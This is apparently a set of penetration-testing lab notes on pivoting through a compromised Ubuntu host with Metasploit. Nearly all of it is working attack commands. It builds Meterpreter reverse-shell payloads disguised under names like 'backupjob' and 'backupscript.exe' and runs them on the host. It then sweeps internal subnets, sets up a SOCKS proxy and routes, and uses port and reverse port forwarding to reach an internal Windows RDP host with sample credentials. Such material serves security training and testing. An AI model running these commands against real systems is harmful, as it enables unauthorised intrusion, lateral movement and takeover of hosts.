#### Creating Payload for Ubuntu Pivot Host
```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip-attacker> -f elf -o backupjob LPORT=8080
```
#### Upload payload using SCP
```
scp backupjob ubuntu@<target-ip>:~/
```
#### Configuring & Starting the multi/handler
```shell
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run
```
#### Executing the Payload on the Pivot Host
```shell
ls
chmod +x backupjob 
./backupjob
```
#### Meterpreter Session Establishment
```meterpreter
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```
#### Ping Sweep
```shell
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
#### Ping Sweep For Loop on Linux Pivot Hosts
```shell
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
#### Ping Sweep For Loop Using CMD
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
#### Ping Sweep Using PowerShell
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```
#### Configuring MSF's SOCKS Proxy
```shell
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
```
#### Confirming Proxy Server is Running
```
jobs


0   Auxiliary: server/socks_proxy
```
#### Adding a Line to proxychains.conf if Needed
```
tail -4 /etc/proxychains.conf
```
```shell
socks4 	127.0.0.1 9050
```
#### Creating Routes with AutoRoute
```shell
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```
It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
```meterpreter
run autoroute -s 172.16.5.0/23
```
#### Listing Active Routes with AutoRoute
```meterpreter
run autoroute -p
```
#### Testing Proxy & Routing Functionality
```shell
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```
## Port Forwarding
```meterpreter
help portfwd
```
#### Creating Local TCP Relay
```meterpreter
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
#### Connecting to Windows Target through localhost
```shell
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```
#### Netstat Output
```shell
netstat -antp
```
## Meterpreter Reverse Port Forwarding
#### Reverse Port Forwarding Rules
```meterpreter
portfwd add -R -l 8081 -p 1234 -L <ip-attacker>
```
#### Configuring & Starting multi/handler
```meterpreter
bg
```

```meterpreter
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081 
set LHOST 0.0.0.0 
run
```
#### Generating the Windows Payload
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```
#### Transfer using SCP
```
scp backupscript.exe ubuntu@10.129.202.64:~/
```
#### Establishing the Meterpreter session
```meterpreter
shell

whoami
```